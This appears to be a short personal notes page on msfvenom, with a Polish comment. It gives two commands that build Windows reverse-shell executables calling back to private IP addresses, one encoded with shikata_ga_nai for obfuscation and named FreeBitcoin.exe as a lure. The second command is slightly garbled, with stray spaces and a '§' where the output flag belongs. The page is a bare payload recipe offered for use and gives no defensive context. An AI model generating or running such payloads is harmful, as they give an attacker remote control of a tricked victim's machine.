---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# msfvenom

{% code overflow="wrap" fullWidth="true" %}
```python
msfvenom -p windows/x64/powershell_reverse_tcp lhost=10.20.10.10 -f exe -o payload.exe

#można dodać -e do obfuskacji
msfvenom -p windows/meterpreter/reverse_ tcp LHOST=10.0.2.22 LPORT=4444 -e X86/shikata_ga_ nai -f exe § FreeBitcoin.exe
```
{% endcode %}

<div data-full-width="true">

<figure><img src=".gitbook/assets/Screenshot 2023-07-25 at 16.02.14 (1).png" alt=""><figcaption></figcaption></figure>

</div>
